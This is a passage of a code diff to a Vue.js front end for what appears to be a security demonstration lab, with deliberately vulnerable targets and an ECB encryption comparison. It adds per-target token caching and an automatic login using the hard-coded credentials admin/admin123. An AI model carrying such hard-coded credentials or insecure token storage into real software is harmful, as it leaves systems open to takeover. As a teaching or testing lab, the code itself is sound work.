           this.ecbResults = '两个相同文件已上传，请点击"比较加密结果"';
           this.addLog('两个相同文件上传成功');
         } else {
-          this.ecbResults = '文件上传失败';
+          this.ecbResults = `文件上传失败: ${data1.message || data2.message || '未知错误'}`;
+          this.addLog(`文件上传失败: ${data1.message || data2.message || '未知错误'}`, 'error');
         }
       } catch (error) {
         this.ecbResults = `上传失败: ${error.message}`;
+        this.addLog(`上传失败: ${error.message}`, 'error');
       }
     },
     
@@ -1006,32 +1372,74 @@ export default {
     
     // 辅助方法
     async getToken() {
-      // 尝试从本地存储获取token
-      const token = localStorage.getItem('jwt_token');
-      if (token && this.selectedTarget !== 'unauth' && this.selectedTarget !== 'full_vuln') {
-        return token;
+      // 对于不需要token的目标直接返回null
+      if (this.selectedTarget === 'unauth' || this.selectedTarget === 'full_vuln') {
+        return null;
       }
       
-      // 如果需要token但未找到，尝试登录
-      if (this.selectedTarget !== 'unauth' && this.selectedTarget !== 'full_vuln') {
+      // 为每个目标使用不同的token键名，避免混淆
+      const tokenKey = `token_${this.selectedTarget}`;
+      let token = localStorage.getItem(tokenKey);
+      
+      // 如果没找到特定目标的token，尝试通用token
+      if (!token) {
+        token = localStorage.getItem('token');
+      }
+      
+      // 检查token是否有效
+      if (token) {
+        // 尝试验证token是否适用于当前目标端口
         try {
-          const response = await fetch(`${this.currentTarget.url}/api/login`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              username: 'admin',
-              password: 'admin123'
-            })
+          // 添加目标端口头部
+          const headers = {
+            'Authorization': `Bearer ${token}`,
+            'x-target-port': this.currentTarget.port
+          };
+          
+          const response = await fetch(`${this.currentTarget.url}/api/files`, {
+            headers: headers
           });
           
-          const data = await response.json();
-          if (data.success && data.token) {
-            localStorage.setItem('jwt_token', data.token);
-            return data.token;
+          if (response.ok) {
+            return token;
+          } else {
+            // Token无效，清除它
+            localStorage.removeItem(tokenKey);
+            localStorage.removeItem('token');
           }
         } catch (error) {
-          console.error('自动登录失败:', error);
+          console.error('Token验证失败:', error);
+          // Token验证失败，清除它
+          localStorage.removeItem(tokenKey);
+          localStorage.removeItem('token');
         }
+      }
+      
+      // 如果需要token但未找到或无效，尝试登录
+      try {
+        const response = await fetch(`${this.currentTarget.url}/api/login`, {
+          method: 'POST',
+          headers: { 
+            'Content-Type': 'application/json',
+            'x-target-port': this.currentTarget.port
+          },
+          body: JSON.stringify({
+            username: 'admin',
+            password: 'admin123'
+          })
+        });
+        
+        const data = await response.json();
+        if (data.success && data.token) {
+          // 为特定目标存储token
+          localStorage.setItem(tokenKey, data.token);
+          return data.token;
+        } else {
+          this.addLog('自动登录失败: ' + (data.message || '未知错误'), 'error');
+        }
+      } catch (error) {
+        this.addLog('自动登录失败: ' + error.message, 'error');
+        console.error('自动登录失败:', error);
       }
       
       return null;
@@ -1228,8 +1636,10 @@ export default {
   border-left: 4px solid #64ffda;
   font-family: 'Consolas', monospace;
   white-space: pre-wrap;
-  max-height: 200px;
+  max-height: 400px;
   overflow-y: auto;
+  word-break: break-all;
+  overflow-wrap: anywhere;
 }
 
 .payload-list {
